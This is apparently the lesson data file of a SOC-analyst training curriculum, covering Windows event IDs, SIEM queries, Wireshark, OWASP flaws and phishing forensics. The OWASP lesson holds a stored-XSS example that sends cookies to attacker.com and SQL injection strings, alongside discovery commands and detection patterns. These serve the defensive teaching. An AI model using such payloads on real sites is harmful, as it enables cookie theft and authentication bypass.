    title: 'Windows Event Logs & Critical Security Event IDs',
    category: 'Windows/AD',
    estimatedMinutes: 65,
    difficulty: 'Intermediate',
    summary: 'Master the top 15 Windows Security Event IDs every SOC analyst must know by heart: 4624 (Logon), 4625 (Failed Logon), 4720 (User Created), 7045 (Service Installed).',
    qaBridge: 'In QA, you check application error logs when a test fails. In a SOC, Windows Security Event Logs are the courtroom evidence used to prove who logged into a machine, what time they arrived, and what process they executed.',
    theory: `
### The Core Windows Event Channels
1. **Security (\`Security.evtx\`):** Authentication, account changes, privilege use, object access.
2. **System (\`System.evtx\`):** Driver loads, service installations (Event ID 7045), hardware errors.
3. **Application (\`Application.evtx\`):** Application crashes, SQL/Exchange errors.
4. **Sysmon (\`Microsoft-Windows-Sysmon/Operational\`):** Deep endpoint telemetry (Process creation with full command line, network connections, file creation).

---

### The "Must-Memorize" Windows Event IDs

| Event ID | Channel | Description / Threat Significance |
| :--- | :--- | :--- |
| **4624** | Security | **Successful Logon** (Check Logon Type: 2=Interactive, 3=Network, 10=RDP) |
| **4625** | Security | **Failed Logon** (Multiple in a short burst = Password Spray or Brute Force) |
| **4672** | Security | **Special Privileges Assigned** (User logged in with Admin rights) |
| **4720** | Security | **User Account Created** (Attacker creating backdoor admin account) |
| **4726** | Security | **User Account Deleted** (Covering tracks or unauthorized cleanup) |
| **4738** | Security | **User Account Modified** (Password reset or group privilege changes) |
| **7045** | System | **A Service Was Installed** (Malware persistence or PsExec lateral movement) |
| **1102** | Security | **The Audit Log Was Cleared** (RED ALERT: Attacker destroying evidence!) |
| **Sysmon 1** | Sysmon | **Process Creation** (Shows full CommandLine, ParentProcess, Hashes) |
| **Sysmon 3** | Sysmon | **Network Connection** (Shows process communicating to external IP) |
    `,
    codeSnippet: {
      language: 'powershell',
      title: 'Hunting Failed Logons with PowerShell Get-WinEvent',
      code: `# Extract recent failed logon events (Event ID 4625) from Security log
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 | 
  Select-Object TimeCreated, 
                @{N='TargetUser';E={$_.Properties[5].Value}}, 
                @{N='Workstation';E={$_.Properties[11].Value}}, 
                @{N='IpAddress';E={$_.Properties[18].Value}} | Format-Table
`
    },
    practicalExercise: 'Open our SIEM Log Simulator tab, select the Windows Security Log source, and query for `EventID=4625`. Group by `TargetUserName` to detect the brute force attacker.',
    cheatSheet: [
      { key: '4624', val: 'Successful Logon (Type 2=Console, Type 3=Network, Type 10=RDP)' },
      { key: '4625', val: 'Failed Logon Attempt' },
      { key: '4720', val: 'New User Account Created' },
      { key: '7045', val: 'New Windows Service Created (Persistence / PsExec)' },
      { key: '1102', val: 'Audit Log Cleared (High Severity Anti-Forensics)' }
    ],
    quizId: 'quiz-day-27'
  },

  // ==========================================
  // MONTH 2: SOC DEFENSE & SIEM MASTERY
  // ==========================================
  {
    day: 31,
    week: 5,
    month: 2,
    title: 'Anatomy of a SOC & The Incident Response Lifecycle',
    category: 'Threat Intelligence',
    estimatedMinutes: 55,
    difficulty: 'Intermediate',
    summary: 'Understand how a 24/7 Security Operations Center works, the roles of Tier 1, 2, and 3 analysts, and the NIST SP 800-61 / SANS 6-step Incident Response framework.',
    qaBridge: 'In QA, you follow a Defect Lifecycle (New -> Assigned -> In Progress -> Retest -> Closed). In a SOC, you follow the Incident Response Lifecycle (Preparation -> Detection -> Containment -> Eradication -> Recovery -> Post-Incident Lessons Learned).',
    theory: `
### SOC Hierarchy & Roles
* **Tier 1 (SOC Analyst / Triage):** Monitors incoming SIEM alerts, filters out false positives, enriches alerts with threat intelligence, and escalates true incidents within SLA (Service Level Agreement - e.g. 15 minutes).
* **Tier 2 (Incident Responder / Deep Investigator):** Conducts deep endpoint forensics, analyzes packet captures, identifies scope of breach, and coordinates containment.
* **Tier 3 (Threat Hunter / Senior Responder):** Proactively searches the environment for stealthy adversaries who bypassed automated alerts; reverse-engineers malware.
* **SOC Manager / Lead:** Manages operations, metric reporting (MTTD - Mean Time to Detect, MTTR - Mean Time to Respond), and executive communications.

---

### The SANS 6-Step Incident Response Lifecycle (Crucial Interview Question)
\`\`\`
1. Preparation          ---> Hardening, playbooks, tools, logging configurations
       ↓
2. Identification (Detection) -> Alert triggered in SIEM; triage & verify True Positive
       ↓
3. Containment          ---> Isolate infected host from network; disable compromised accounts
       ↓
4. Eradication          ---> Terminate malicious processes, remove malware persistence/registry keys
       ↓
5. Recovery             ---> Restore system from clean backup, verify patched state, reconnect to network
       ↓
6. Lessons Learned      ---> Post-mortem report: How did they get in? How do we prevent it in future?
\`\`\`
    `,
    codeSnippet: {
      language: 'markdown',
      title: 'Tier 1 SOC Analyst Escalation Ticket Template',
      code: `### SOC INCIDENT ESCALATION TICKET #2026-0842
- **Severity:** HIGH
- **Timestamp:** 2026-08-31 14:22:10 UTC
- **Affected Asset:** WS-FINANCE-04 (192.168.10.45)
- **Compromised User:** john.doe (Finance Dept)
- **Initial Alert:** SIEM Alert #9412 - Suspicious PowerShell Encoded Payload
- **Summary of Findings:** User downloaded invoice_august.zip from external phishing email. Process tree shows Outlook.exe -> powershell.exe executing base64 encoded download cradle reaching out to 198.51.100.42:8080.
- **Immediate Actions Taken:** Host WS-FINANCE-04 isolated via EDR. User credentials disabled in AD.
- **Escalation Reason:** Suspected C2 beaconing & possible data staging. Requesting Tier 2 forensic acquisition.
`
    },
    practicalExercise: 'Review our SOC Alert Triage tool in the app and step into the shoes of a Tier 1 Analyst to investigate Alert #101.',
    cheatSheet: [
      { key: 'Tier 1 Role', val: 'Alert triage, false positive elimination, initial enrichment, escalation' },
      { key: 'MTTD', val: 'Mean Time to Detect - How fast threats are spotted' },
      { key: 'MTTR', val: 'Mean Time to Respond / Remediate' },
      { key: 'Containment', val: 'Isolating host or blocking IPs to prevent spread' }
    ],
    quizId: 'quiz-day-31'
  },
  {
    day: 34,
    week: 5,
    month: 2,
    title: 'MITRE ATT&CK Framework & The Cyber Kill Chain',
    category: 'Threat Intelligence',
    estimatedMinutes: 60,
    difficulty: 'Intermediate',
    summary: 'Master the Lockheed Martin Cyber Kill Chain and navigate the MITRE ATT&CK matrix: Tactics (the "Why") vs Techniques (the "How").',
    qaBridge: 'In QA, you map test cases to user stories in Jira. In Cyber Security, you map observed attacker behaviors and detection rules to MITRE ATT&CK Tactics & Techniques.',
    theory: `
### Lockheed Martin Cyber Kill Chain (7 Phases)
1. **Reconnaissance:** Harvesting email addresses, scanning open ports, OSINT.
2. **Weaponization:** Coupling exploit with backdoor payload into a deliverable file (e.g. malicious PDF).
3. **Delivery:** Transmitting weaponized payload to target via phishing email or USB.
4. **Exploitation:** Exploiting a vulnerability on the victim endpoint to execute code.
5. **Installation:** Installing malware / webshell on victim machine for persistence.
6. **Command & Control (C2):** Establishing encrypted beaconing channel back to attacker server.
7. **Actions on Objectives:** Exfiltrating sensitive customer database or detonating ransomware.

---

### MITRE ATT&CK Framework
MITRE ATT&CK is the globally accessible knowledge base of adversary tactics and techniques based on real-world observations.

* **Tactics (14 Total):** The adversary's tactical goal (The **WHY**):
  * Initial Access (TA0001)
  * Execution (TA0002)
  * Persistence (TA0003)
  * Privilege Escalation (TA0004)
  * Defense Evasion (TA0005)
  * Credential Access (TA0006)
  * Discovery (TA0007)
  * Lateral Movement (TA0008)
  * Collection (TA0009)
  * Command and Control (TA0011)
  * Exfiltration (TA0010)
  * Impact (TA0040)
* **Techniques:** How the adversary achieves that goal (The **HOW**):
  * Example: Tactic = *Credential Access*, Technique = *OS Credential Dumping: LSASS Memory (T1003.001)*.
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Simulating MITRE ATT&CK Technique T1087 (Account Discovery)',
      code: `# Tactic: Discovery | Technique: T1087.001 (Local Account Discovery)
net user                   # Windows: Enumerate local user accounts
whoami /priv               # Windows: Enumerate assigned user privileges
cat /etc/passwd | cut -d: -f1 # Linux: Enumerate local users
`
    },
    practicalExercise: 'Visit attack.mitre.org. Search for "T1059.001 (PowerShell)". Read the description and see which Threat Groups (like Lazarus, FIN7) actively use it.',
    cheatSheet: [
      { key: 'Tactics', val: 'The adversary goal (Why: Initial Access, Persistence, Credential Access)' },
      { key: 'Techniques', val: 'The specific method used (How: Phishing, LSASS Dumping, Scheduled Task)' },
      { key: 'C2', val: 'Command and Control - communication channel between victim and attacker' }
    ],
    quizId: 'quiz-day-34'
  },
  {
    day: 36,
    week: 5,
    month: 2,
    title: 'Threat Intelligence, IOCs & The Pyramid of Pain',
    category: 'Threat Intelligence',
    estimatedMinutes: 50,
    difficulty: 'Intermediate',
    summary: 'Understand Indicators of Compromise (IOCs), threat feeds, and David Bianco\'s Pyramid of Pain (Hash Values -> TTPs).',
    qaBridge: 'In QA, you log bug reproduction steps. In Threat Intelligence, you extract Indicators of Compromise (hashes, IPs, malicious domains) so your detection systems automatically alert whenever that artifact appears anywhere in the enterprise.',
    theory: `
### David Bianco\'s Pyramid of Pain
The Pyramid of Pain illustrates how difficult it is for an adversary to change their indicator when a security team blocks it.

\`\`\`
                     /\\
                    /  \\
                   /    \\
                  / TTPs \\          ---> [ TOUGH! ] (Tactics, Techniques, & Procedures)
                 /--------\\
                /  Tools   \\        ---> [ Challenging ] (Mimikatz, Cobalt Strike)
               /------------\\
              / Domain Names \\      ---> [ Simple ] (malicious-paypa1.com)
             /----------------\\
            /   IP Addresses   \\    ---> [ Easy ] (198.51.100.23)
           /--------------------\\
          /     Hash Values      \\  ---> [ Trivial ] (MD5, SHA-256)
         /________________________\\
\`\`\`

* **Hash Values (Trivial to change):** Changing a single byte in a malware binary completely changes its SHA-256 hash. Blocking hashes alone is insufficient.
* **IP Addresses & Domains (Easy/Simple):** Attackers spin up cheap VPS servers and fast-flux DNS domains in seconds.
* **TTPs (Tough to change):** How the attacker actually behaves (e.g. their custom lateral movement methodology). Forcing them to change TTPs costs them months of retraining and research!
    `,
    codeSnippet: {
      language: 'python',
      title: 'Python Script to Query VirusTotal API for File Hash',
      code: `import urllib.request
import json

def check_file_hash_vt(file_hash, api_key):
    url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
    req = urllib.request.Request(url, headers={"x-apikey": api_key})
    try:
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode())
            stats = data['data']['attributes']['last_analysis_stats']
            print(f"[+] VT Detections for {file_hash}:")
            print(f"    Malicious: {stats['malicious']} / {stats['malicious'] + stats['undetected']}")
    except Exception as e:
        print(f"[-] Lookup failed: {e}")
`
    },
    practicalExercise: 'Use VirusTotal to search hash `44d88612fea8a8f36de82e1278abb02f`. Identify what malware family this famous EICAR test string represents.',
    cheatSheet: [
      { key: 'Hash (Trivial)', val: 'MD5, SHA-1, SHA-256 (Trivial for attacker to modify)' },
      { key: 'IP / Domain (Easy)', val: 'Infrastructure addresses; easily rotated' },
      { key: 'TTPs (Tough)', val: 'Tactics, Techniques, & Procedures (Hardest for attacker to change)' }
    ],
    quizId: 'quiz-day-36'
  },
  {
    day: 38,
    week: 6,
    month: 2,
    title: 'SIEM Architecture & Ingestion Pipeline',
    category: 'SIEM & Logs',
    estimatedMinutes: 60,
    difficulty: 'Intermediate',
    summary: 'What is a SIEM? Understand Splunk, Elastic/ELK, Microsoft Sentinel, and Wazuh log collectors, forwarders, indexers, and correlation rules.',
    qaBridge: 'In QA testing, you look at test reporting dashboards. In security operations, the SIEM is your single pane of glass that ingests gigabytes of logs per second from thousands of endpoints, firewalls, and servers to surface anomalies.',
    theory: `
### What is a SIEM?
**SIEM** stands for **Security Information and Event Management**. It provides:
1. **Centralized Log Aggregation:** Pulling logs from Windows servers, Linux machines, Firewalls, AWS/Azure clouds, and Office 365.
2. **Log Normalization & Parsing:** Transforming diverse log formats (JSON, Syslog, EVTX) into standardized schemas (e.g. Elastic Common Schema / ECS).
3. **Correlation Engine:** Matching events across multiple different systems (e.g., Firewall saw connection to IP X + Endpoint ran powershell downloading from IP X = Trigger High-Severity Alert!).
4. **Compliance & Archiving:** Retaining historical audit logs for 1 to 7 years for forensic inquiries.

\`\`\`
[ Log Sources ]          [ Ingestion & Parsing ]         [ Storage & Indexing ]        [ SOC Dashboard ]
Windows Endpoints  ──>  Logstash / Splunk Forwarder ──>  Elasticsearch / Splunk Indexer ──> Kibana / Splunk UI
Linux Servers      ──>                                                                      (Alerts & Queries)
Firewalls & Cloud  ──>
\`\`\`
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Simulating Syslog Ingestion with Logger',
      code: `# Send a synthetic security log to local syslog daemon
logger -p auth.alert "POSSIBLE_BRUTE_FORCE: 5 failed login attempts for user admin from 192.168.1.100"

# Verify the log landed in the log file
tail -n 1 /var/log/syslog
`
    },
    practicalExercise: 'Open our built-in SIEM Log Hunter in the app. Practice filtering by `sourcetype="auth.log"` and search for brute force patterns.',
    cheatSheet: [
      { key: 'SIEM', val: 'Security Information & Event Management' },
      { key: 'Correlation Rule', val: 'Logic that triggers an alert when specific log conditions occur together' },
      { key: 'Forwarder / Agent', val: 'Lightweight service installed on endpoints to ship logs to SIEM' }
    ],
    quizId: 'quiz-day-38'
  },
  {
    day: 41,
    week: 6,
    month: 2,
    title: 'Splunk SPL & KQL Querying for Incident Triage',
    category: 'SIEM & Logs',
    estimatedMinutes: 65,
    difficulty: 'Intermediate',
    summary: 'Master Splunk Search Processing Language (SPL) and Microsoft Kusto Query Language (KQL) to write powerful threat hunting queries.',
    qaBridge: 'If you know SQL (SELECT * FROM users WHERE status = "fail"), writing Splunk SPL and KQL is essentially writing SQL queries against streaming log events.',
    theory: `
### Core Splunk SPL Commands
Every SPL query begins with search criteria, followed by pipe \`|\` operators that manipulate the dataset:

1. \`index=*\` / \`sourcetype=*\`: Specifies which dataset to search.
2. \`stats count by user, src_ip\`: Aggregates and counts occurrences.
3. \`eval is_failed=if(status==401, 1, 0)\`: Computes custom calculated fields.
4. \`where count > 5\`: Filters calculated statistical results.
5. \`table _time, user, src_ip, action\`: Formats output into clean table columns.
6. \`timechart span=1h count by user\`: Visualizes spikes over time.

---

### Splunk vs KQL Comparison Table

| Goal | Splunk SPL | Microsoft KQL (Sentinel / Defender) |
| :--- | :--- | :--- |
| **Search Failed Logons** | \`index=security EventCode=4625\` | \`SecurityEvent \| where EventID == 4625\` |
| **Count by User** | \`... \| stats count by user\` | \`... \| summarize Count = count() by TargetUserName\` |
| **Filter by Count** | \`... \| where count > 10\` | \`... \| where Count > 10\` |
| **Sort Descending** | \`... \| sort - count\` | \`... \| order by Count desc\` |
| **Select Columns** | \`... \| table _time, user, ip\` | \`... \| project TimeGenerated, TargetUserName, IpAddress\` |
    `,
    codeSnippet: {
      language: 'spl',
      title: 'Top 3 Splunk SPL Security Hunting Queries',
      code: `\`\`\`spl
# 1. Detect Potential Password Spraying (Same source IP hitting 5+ different usernames):
index=wineventlog EventCode=4625
| stats dc(TargetUserName) as unique_users, values(TargetUserName) as targeted_users by IpAddress
| where unique_users >= 5
| sort - unique_users

# 2. Detect Suspicious PowerShell Execution with Encoded Commands:
index=wineventlog (EventCode=4688 OR EventCode=1) Image="*powershell.exe"
| search CommandLine="*-enc*" OR CommandLine="*-encodedcommand*" OR CommandLine="*downloadstring*"
| table _time, ComputerName, User, CommandLine

# 3. Detect Outbound Beaconing to Rare Ports:
index=firewall action=allowed dest_port NOT IN (80, 443, 53, 123)
| stats count by src_ip, dest_ip, dest_port
| where count > 100
\`\`\`
`
    },
    practicalExercise: 'Use our SIEM simulator tab to run `EventCode=4625 | stats count by user` and observe how the aggregation table updates in real time.',
    cheatSheet: [
      { key: 'stats count by field', val: 'Group and count unique values in Splunk' },
      { key: 'dc(field)', val: 'Distinct Count (count unique distinct values)' },
      { key: 'KQL summarize', val: 'KQL equivalent of Splunk stats command' }
    ],
    quizId: 'quiz-day-41'
  },
  {
    day: 45,
    week: 7,
    month: 2,
    title: 'Network Traffic Analysis with Wireshark',
    category: 'Packet Analysis',
    estimatedMinutes: 65,
    difficulty: 'Intermediate',
    summary: 'Master Wireshark packet capture analysis: display filters, TCP stream reassembly, extracting cleartext credentials, and spotting DNS tunneling.',
    qaBridge: 'In QA, you inspect network payloads using browser DevTools Network tab. Wireshark is DevTools on steroids—it captures every single raw packet on the wire, including non-HTTP protocols like DNS, ARP, and TCP handshakes.',
    theory: `
### Wireshark Layout & Essential Workflow
1. **Packet List Pane:** Shows packet number, time, source IP, destination IP, protocol, length, and info.
2. **Packet Details Pane:** Tree view showing Layer 2 Ethernet, Layer 3 IPv4/v6, Layer 4 TCP/UDP, and Layer 7 Application payload.
3. **Packet Bytes Pane:** Raw Hex and ASCII representation of the packet bits.

---

### Top Wireshark Display Filters for Defenders
* \`http.request.method == "POST"\`: Find login submissions or file uploads.
* \`http contains "password" || http contains "admin"\`: Search for plaintext credentials.
* \`tcp.flags.syn == 1 && tcp.flags.ack == 0\`: Filter only initial SYN connection requests (useful for spotting SYN flood attacks or port scans).
* \`dns.flags.response == 0\`: Filter DNS query requests.
* \`ip.addr == 192.168.1.50\`: Show all traffic to or from a specific host.
* \`frame contains "cmd.exe"\`: Search full packet stream for shell executions.

---

### Reassembling TCP Streams ("Follow TCP Stream")
When web traffic or telnet flows over multiple TCP packets, right-clicking any packet and selecting **Follow -> TCP Stream** reconstructs the complete back-and-forth conversation in human-readable ASCII text (Client requests in Red, Server responses in Blue).
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Tshark (Command-line Wireshark) Analysis Commands',
      code: `# Read a pcap file and extract all HTTP GET/POST URLs
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri

# Extract all DNS queries to detect potential DNS tunneling (high-volume subdomains)
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort | uniq -c | sort -nr | head -n 15
`
    },
    practicalExercise: 'Open our interactive Wireshark Simulator tab in the app. Load the "Cleartext HTTP Credentials" capture and find the username and password in the POST payload.',
    cheatSheet: [
      { key: 'http.request.method == "POST"', val: 'Find submitted forms/credentials' },
      { key: 'tcp.flags.reset == 1', val: 'Find dropped/rejected connections' },
      { key: 'Follow TCP Stream', val: 'Reconstructs entire bidirectional session text' }
    ],
    quizId: 'quiz-day-45'
  },
  {
    day: 52,
    week: 8,
    month: 2,
    title: 'Python Scripting for Security Automation',
    category: 'Python Scripting',
    estimatedMinutes: 60,
    difficulty: 'Intermediate',
    summary: 'Learn practical Python for SOC analysts: socket programming, regular expressions for log parsing, hashing with hashlib, and calling Threat Intel REST APIs.',
    qaBridge: 'If you have written test automation scripts in Python (Selenium/PyTest) or JavaScript (Cypress), writing Python security automation is virtually identical—parsing data, testing assertions, and making API requests.',
    theory: `
### Why Python is the #1 Language for Security Analysts
SOC Analysts write Python scripts to:
1. **Automate repetitive alert enrichment:** Extract IP from SIEM alert -> query AbuseIPDB / VirusTotal API -> comment verdict on Jira ticket.
2. **Bulk Log Parsing:** Parse 1,000,000 log lines with Regular Expressions (\`re\` module) to find hidden webshell requests.
3. **Port Scanning & Socket Probing:** Build lightweight scripts to test if internal servers have vulnerable ports exposed.
4. **File Hash Calculation:** Calculate SHA-256 hashes of downloaded email attachments.

---

### Key Python Security Libraries
* \`re\`: Regular expression pattern matching (extracting IPv4, URLs, MAC addresses).
* \`hashlib\`: Cryptographic hashing (MD5, SHA-1, SHA-256).
* \`socket\`: Low-level TCP/UDP network communication.
* \`requests\` / \`urllib\`: HTTP requests to interact with REST APIs.
* \`json\`: Parsing SIEM alerts and API responses.
    `,
    codeSnippet: {
      language: 'python',
      title: 'Complete Python Security Script: Automated Log Parser & IP Extractor',
      code: `import re
from collections import Counter

# Sample raw log data
log_data = """
2026-08-31 10:14:02 Failed password for root from 198.51.100.42 port 4210 ssh2
2026-08-31 10:14:05 Failed password for admin from 198.51.100.42 port 4212 ssh2
2026-08-31 10:14:08 Failed password for ubuntu from 198.51.100.42 port 4214 ssh2
2026-08-31 10:15:20 Accepted password for deploy from 192.168.1.50 port 5120 ssh2
2026-08-31 10:16:11 Failed password for root from 203.0.113.88 port 3310 ssh2
"""

# Regex pattern for matching IPv4 addresses
ip_pattern = r'\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b'

# Find all failed login lines and extract IPs
failed_ips = []
for line in log_data.strip().split('\\n'):
    if "Failed password" in line:
        match = re.search(ip_pattern, line)
        if match:
            failed_ips.append(match.group(0))

print("[*] Failed Login Analysis Report:")
counts = Counter(failed_ips)
for ip, count in counts.items():
    print(f"[-] IP {ip} -> {count} failed attempts")
    if count >= 3:
        print(f"    [!] ALERT: High-volume brute-force threshold reached for {ip}!")
`
    },
    practicalExercise: 'Run the Python Security Script in our built-in Scripting Sandbox and experiment with modifying the threshold and parsing logic.',
    cheatSheet: [
      { key: 're.search(pattern, text)', val: 'Find regex pattern in text' },
      { key: 'hashlib.sha256(data).hexdigest()', val: 'Compute SHA-256 hash' },
      { key: 'socket.socket(socket.AF_INET, socket.SOCK_STREAM)', val: 'Create TCP socket' }
    ],
    quizId: 'quiz-day-52'
  },

  // ==========================================
  // MONTH 3: APPSPEC, INCIDENTS & CAREER SHIFT
  // ==========================================
  {
    day: 61,
    week: 9,
    month: 3,
    title: 'Web Application Security & HTTP Security Headers',
    category: 'Web AppSec/OWASP',
    estimatedMinutes: 55,
    difficulty: 'Intermediate',
    summary: 'Master web security architecture: Cookies (HttpOnly, Secure, SameSite), JWT token vulnerabilities, CORS, and defensive HTTP Security Headers (CSP, HSTS, X-Frame-Options).',
    qaBridge: 'In QA, you test that auth tokens allow users to navigate between pages. In Security, you test what happens if a cookie lacks the HttpOnly flag (stolen via XSS) or if a JWT has "alg": "none" (forged authentication).',
    theory: `
### Securing Web Authentication & Cookies
Cookies store session tokens. Without proper security flags, attackers can steal them:
1. **\`HttpOnly\`:** Prevents client-side JavaScript (\`document.cookie\`) from reading the cookie. **Blocks 99% of XSS-based cookie theft!**
2. **\`Secure\`:** Ensures cookie is transmitted ONLY over encrypted HTTPS connections (never over plaintext HTTP).
3. **\`SameSite=Strict/Lax\`:** Restricts cookie transmission in cross-site requests, mitigating **Cross-Site Request Forgery (CSRF)**.

---

### Crucial Defensive HTTP Security Headers
* **Content-Security-Policy (CSP):** Restricts which domains scripts, stylesheets, and images can load from (primary defense against XSS and data injection).
* **Strict-Transport-Security (HSTS):** Forces browsers to communicate ONLY over HTTPS for the next N seconds (\`max-age=31536000; includeSubDomains\`), preventing SSL-stripping attacks.
* **X-Frame-Options: \`DENY\` or \`SAMEORIGIN\`:** Prevents malicious websites from framing your login page inside an invisible iframe (**Clickjacking Defense**).
* **X-Content-Type-Options: \`nosniff\`:** Prevents browser from MIME-sniffing files away from declared content-type.
    `,
    codeSnippet: {
      language: 'http',
      title: 'Secure Response Headers Example',
      code: `HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Set-Cookie: session_id=abc123xyz; Path=/; Secure; HttpOnly; SameSite=Strict
`
    },
    practicalExercise: 'Open our OWASP Playground tab and test how setting the `HttpOnly` flag protects simulated session tokens from XSS payload extraction.',
    cheatSheet: [
      { key: 'HttpOnly', val: 'Prevents JavaScript from accessing cookie (Defeats XSS token theft)' },
      { key: 'Secure Flag', val: 'Forces cookie to only send over HTTPS' },
      { key: 'CSP', val: 'Content Security Policy - defines trusted script sources' },
      { key: 'X-Frame-Options', val: 'Prevents Clickjacking iframe embedding' }
    ],
    quizId: 'quiz-day-61'
  },
  {
    day: 64,
    week: 9,
    month: 3,
    title: 'OWASP Top 10 Deep Dive: SQLi, XSS & IDOR',
    category: 'Web AppSec/OWASP',
    estimatedMinutes: 65,
    difficulty: 'Intermediate',
    summary: 'Deep dive into the most dangerous web vulnerabilities: SQL Injection, Cross-Site Scripting (Reflected/Stored), and Insecure Direct Object References (IDOR).',
    qaBridge: 'Your portfolio already shows case studies on IDOR and auth flaw discovery! In an enterprise SOC / AppSec role, you bridge the gap by explaining both how the vulnerability is exploited and how the engineering team must fix it in code (e.g. Parameterized Queries, Server-side RBAC).',
    theory: `
### 1. SQL Injection (SQLi)
* **How it happens:** Untrusted user input is directly concatenated into a backend SQL database query string without sanitization or parameterized binding.
* **Attacker Payload:** \`admin' OR 1=1 --\`
* **Backend Result:** \`SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = 'xxx'\` -> Query evaluates to TRUE, bypassing authentication!
* **Remediation:** **Parameterized Queries (Prepared Statements)**. The database treats user input strictly as literal data, never as executable SQL commands.

---

### 2. Cross-Site Scripting (XSS)
* **Reflected XSS:** Malicious script in URL parameter is reflected immediately in the server response.
* **Stored XSS (High Severity):** Attacker posts malicious script (\`<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>\`) into a forum comment or profile field. Every user who views that page executes the script!
* **Remediation:** Context-aware output encoding (HTML Entity Encoding) + Strict Content Security Policy (CSP).

---

### 3. Broken Object Level Authorization (IDOR)
* **How it happens:** Application exposes a reference to an internal database object ID (e.g., \`GET /api/invoices/1045\`) and fails to verify if the currently authenticated user owns invoice #1045.
* **Attacker Action:** Changes ID to \`1046\`, \`1047\` to view other customer invoices.
* **Remediation:** Server-side authorization check: \`SELECT * FROM invoices WHERE id = ? AND user_id = current_user.id\`.
    `,
    codeSnippet: {
      language: 'sql',
      title: 'Vulnerable SQL vs Secure Parameterized Query',
      code: `-- ❌ VULNERABLE CODE (Direct String Concatenation):
-- query = "SELECT * FROM accounts WHERE acc_num = '" + userInput + "'"
SELECT * FROM accounts WHERE acc_num = '1001' OR '1'='1';

-- ✅ SECURE CODE (Parameterized / Prepared Statement):
-- stmt = db.prepare("SELECT * FROM accounts WHERE acc_num = ?")
-- stmt.execute([userInput])
-- The database treats "'1001' OR '1'='1'" strictly as a literal string account number.
`
    },
    practicalExercise: 'Go to the OWASP Playground tab in the app, test the interactive SQL Injection simulator, and observe how parameterized queries neutralize the attack.',
    cheatSheet: [
      { key: 'SQLi Fix', val: 'Parameterized Queries / Prepared Statements (NEVER string concat)' },
      { key: 'XSS Fix', val: 'Output Encoding + Content Security Policy (CSP) + HttpOnly' },
      { key: 'IDOR Fix', val: 'Server-side authorization validation (verify user owns object)' }
    ],
    quizId: 'quiz-day-64'
  },
  {
    day: 77,
    week: 11,
    month: 3,
    title: 'SOC Playbook 1: Phishing Investigation & Email Forensics',
    category: 'Incident Response',
    estimatedMinutes: 65,
    difficulty: 'Intermediate',
    summary: 'Master the end-to-end phishing triage playbook: analyzing RFC 822 email headers, verifying SPF, DKIM, and DMARC, detonating attachments, and extracting malicious URLs.',
    qaBridge: 'In QA, you verify that emails sent by the system have correct templates and links. In Phishing Forensics, you inspect the raw email MIME structure to prove the sender domain was spoofed and find the credential-harvesting server.',
    theory: `
### Email Authentication Protocols (Must Know for Interviews!)
1. **SPF (Sender Policy Framework):** DNS TXT record listing which mail server IP addresses are authorized to send email on behalf of a domain.
2. **DKIM (DomainKeys Identified Mail):** Cryptographic digital signature attached to email headers, verified using the sender domain\'s public DNS key. Proves email was not altered in transit.
3. **DMARC (Domain-based Message Authentication, Reporting & Conformance):** Policy instructing recipient mail servers what to do if SPF or DKIM fails (\`p=none\`, \`p=quarantine\`, \`p=reject\`).

---

### Step-by-Step Phishing Investigation Workflow
1. **Extract Raw Email Headers (.eml or .msg):** Inspect \`Return-Path\`, \`Received: from\` IP hops, \`Authentication-Results\`.
2. **Analyze the Sender:** Compare Display Name (\`CEO John Doe <attacker@gmail-verify.com>\`) vs actual Envelope From.
3. **Defang URLs & IOCs:** Replace \`http://evil.com\` with \`hxxp[://]evil[.]com\` to prevent accidental clicks in tickets.
4. **URL & Attachment Analysis:**
   * Query URL reputation in URLScan.io and VirusTotal.
   * Calculate SHA-256 hash of attachment; check sandbox execution reports.
5. **Containment Actions:**
   * Search Exchange/O365 logs for other recipients of the same Subject or Message-ID.
   * Purge malicious email from all user inboxes.
   * Block sender domain and malicious URL on perimeter Email Gateway & Web Proxy.
    `,
    codeSnippet: {
      language: 'markdown',
      title: 'Analyzing Email Authentication Headers',
      code: `Received: from mail-relay.attacker-server.net (198.51.100.77)
Authentication-Results: spf=fail (sender IP 198.51.100.77 is not in SPF record for company.com);
       dkim=fail header.d=company.com (signature verification failed);
       dmarc=fail (p=QUARANTINE) action=quarantine;
Return-Path: <spoofed-admin@company.com>
X-Originating-IP: [198.51.100.77]
Subject: URGENT: Complete Mandatory Security Update Before 5 PM
`
    },
    practicalExercise: 'Open the SOC Alert Triage tool in the app, inspect Incident #102 ("Phishing Email with Malicious Invoice Attachment"), and complete the investigation ticket.',
    cheatSheet: [
      { key: 'SPF', val: 'Validates authorized sending IP addresses in DNS' },
      { key: 'DKIM', val: 'Cryptographic signature verifying email integrity' },
      { key: 'DMARC', val: 'Policy for handling SPF/DKIM failures (none/quarantine/reject)' },
      { key: 'Defanging', val: 'Modifying IOCs (hxxps[://], 192[.]168[.]1[.]1) to prevent accidental clicks' }
    ],
    quizId: 'quiz-day-77'
  },
  {
    day: 85,
    week: 12,
    month: 3,
    title: 'Building Your Home SOC Lab (Wazuh, Splunk & Wireshark)',
    category: 'Home Labs',
    estimatedMinutes: 60,
    difficulty: 'Intermediate',
    summary: 'Step-by-step blueprints to build an enterprise-grade home cybersecurity lab on your PC using VirtualBox / VMware, Wazuh SIEM, and Splunk Free.',
    qaBridge: 'Setting up a home security lab is identical to setting up a local QA testing environment—spinning up VMs, configuring networks, installing agent software, and generating test data.',
    theory: `
### Why a Home Lab Guarantees Job Offers for Freshers
When interviewers speak with entry-level candidates, 90% have only theoretical knowledge. Having a working **Home SOC Lab** documented on your GitHub/Portfolio proves:
1. You can configure real enterprise tools (Wazuh, Splunk, Sysmon).
